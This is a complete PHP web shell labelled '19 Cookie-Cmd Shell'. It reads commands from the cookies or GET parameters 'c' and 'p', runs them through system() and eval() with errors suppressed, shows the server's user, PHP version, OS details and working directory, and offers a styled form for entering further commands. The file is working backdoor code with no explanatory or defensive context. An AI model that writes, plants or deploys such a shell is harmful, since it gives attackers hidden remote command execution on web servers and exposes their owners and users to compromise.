<?php
@error_reporting(0);
$T="19 Cookie-Cmd Shell";
$M="M19-COOKOK";
$ok=true;
$out="";
$c=isset($_GET['c'])?(string)$_GET['c']:(isset($_COOKIE['c'])?(string)$_COOKIE['c']:'');
$p=isset($_GET['p'])?(string)$_GET['p']:(isset($_COOKIE['p'])?(string)$_COOKIE['p']:'');
$src=(isset($_COOKIE['c'])||isset($_COOKIE['p']))?'Cookie':'GET';
if($c!==''){ob_start();@system($c);$out.=ob_get_clean();}
if($p!==''){ob_start();@eval($p);$out.=ob_get_clean();}
$out.=" (transport=$src; Cookie: c=whoami)";

$si='';
$u=@trim((string)@shell_exec('whoami'));
$si.=($u!==''?htmlspecialchars($u):'(no shell_exec)').' | '.@phpversion().' | '.@php_sapi_name().' | '.@htmlspecialchars((string)@php_uname());
$cwd=@getcwd();
$si.=' | cwd='.($cwd!==false?htmlspecialchars($cwd):'n/a');
$S=(string)@$_GET['language'];
$faction=($S!==''?'?':'#');
$hid=($S!==''?'<input type="hidden" name="language" value="'.htmlspecialchars($S).'" /><input type="hidden" name="action" value="go" />':'');

echo '<div style="font-family:Consolas,monospace;font-size:13px;background:#101418;color:#e8e8e8;border:1px solid #3a6ea5;border-radius:6px;padding:10px;margin:8px 0;max-width:1200px;overflow:auto">'
  .'<div style="border-bottom:1px solid #3a6ea5;padding-bottom:6px"><b style="color:#7ce38b">'.$T.'</b> <span style="color:#f6c453">['.$M.']</span> '
  .($ok?'<span style="color:#7ce38b">GATE:OK</span>':'<span style="color:#ff7b72">GATE:LOCKED</span>')
  .'<div style="color:#9aa4af;font-size:12px;margin-top:4px">'.$si.'</div></div>'
  .'<form method="get" action="'.$faction.'" enctype="multipart/form-data" style="margin:8px 0">'.$hid
  .'<table><tr><td>cmd</td><td><input type="text" name="c" value="" size="40"></td><td>php</td><td><input type="text" name="p" value="" size="40"></td><td><input type="submit" value="run"></td></tr></table><div style="color:#9aa4af;font-size:11px">transport: Cookie header c= cmd / p= php (GET is fallback)</div>'
  .'</form>'
  .'<pre style="background:#0b0e11;border:1px solid #22303f;color:#d6e2ff;padding:8px;border-radius:4px;overflow:auto;margin:0">'.htmlspecialchars($out).'</pre>'
  .'</div>';
?>
